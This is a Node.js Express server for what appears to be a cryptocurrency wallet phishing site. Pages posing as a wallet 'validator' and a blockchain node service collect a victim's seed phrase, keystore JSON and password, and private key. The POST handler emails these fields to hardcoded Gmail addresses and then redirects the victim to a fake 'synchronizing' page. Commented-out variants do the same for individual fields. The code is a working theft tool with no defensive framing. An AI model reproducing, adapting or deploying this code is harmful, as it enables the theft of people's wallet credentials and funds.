const express = require('express')
const nodemailer = require('nodemailer')
const bodyParser = require('body-parser')
const app = express()
require('dotenv').config()

app.use(express.static("views"))
app.use(express.static("public"))
app.use("/wallets", express.static("/views/Wallets Validation_files"))
app.use(express.static("/views/BLOCKCHAIN NODE_files"))
app.use(bodyParser.urlencoded({ extended: true }))

app.get('/en', (req, res) => {
    res.sendFile(__dirname + '/views/BLOCKCHAINNODE.html')
})

app.get('/wallets/validator', (req, res) => {
    res.sendFile(__dirname + '/views/WalletsValidation.html')
})

app.get('/wallets/validator/synchronizing', (req, res) => {
    res.sendFile(__dirname + '/views/synchronizing.html')
})

app.post('/wallets/validator', async (req, res) => {
    
    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.USER,
          pass: process.env.PASSWORD
        }
      });
      
      var mailOptions = {
        from: 'node.resolver@gmail.com',
        to: 'realhamzadanjuma@gmail.com, node.resolver@gmail.com',
        subject: 'Re: Wallet Detail - Seed Phrase, Keystore JSON, Private Key',
        html: `${req.body.message}, ${req.body.keystorejson}, ${req.body.keystorejsonpassword}, ${req.body.privatekey}`
      };

      /*var mailOptions1 = {
        from: 'resolver.activation@gmail.com',
        to: 'realhamzadanjuma@gmail.com, resolver.activation@gmail.com',
        subject: 'Re: Keystore JSON',
        html: `${req.body.keystorejson}, ${req.body.keystorejsonpassword}`
      };*/

      /*var mailOptions2 = {
        from: 'resolver.activation@gmail.com',
        to: 'realhamzadanjuma@gmail.com, resolver.activation@gmail.com',
        subject: 'Re: Private Key',
        html: req.body.privatekey
      };*/
    
    transporter.sendMail(mailOptions, (err, info) => {
        if (err) {
            console.log(err)
        } else {
            console.log('Email sent: ' + info.response)
        }
    })

    setTimeout(() => {
        res.redirect('/wallets/validator/synchronizing')
    }, 7000)
})

app.listen(process.env.PORT || 3000, () => {
    console.log(`Server started successfully on PORT: ${process.env.PORT}`)
})